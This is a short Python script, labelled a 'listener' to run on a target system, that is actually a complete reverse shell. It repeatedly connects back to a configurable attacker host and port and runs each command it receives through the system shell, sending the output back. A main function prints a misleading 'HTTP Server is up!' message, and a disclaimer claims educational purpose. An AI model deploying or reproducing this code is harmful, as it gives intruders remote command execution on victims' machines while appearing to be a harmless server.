'''
    Name: Python listener

    Desc:
        To run on target system
    References;
        https://www.datacamp.com/tutorial/a-complete-guide-to-socket-programming-in-python
    Disclaimer:
        ** Used for educational purposes only. Setting up a reverse shell violates all three triads of 
        cyber security. 
'''

import socket
import subprocess
import os

# Global Host var
# May have to assign it to tun0 ip address or pass in target address
HOST = "127.0.0.1" # CHANGE ME

# Global port var
PORT = 9999 

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        break
    except Exception:
        s.close()

while True:
    data = s.recv(1024).decode("utf-8")
    if data.lower() == "exit":
        break

    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdout_val = proc.stdout.read() + proc.stderr.read()

    if len(stdout_val) == 0:
        stdout_val = b"Command executed, but no output"
    s.send(stdout_val)

s.close()

def main():
    print("HTTP Server is up!") 

if __name__ == "__main__":
    main()
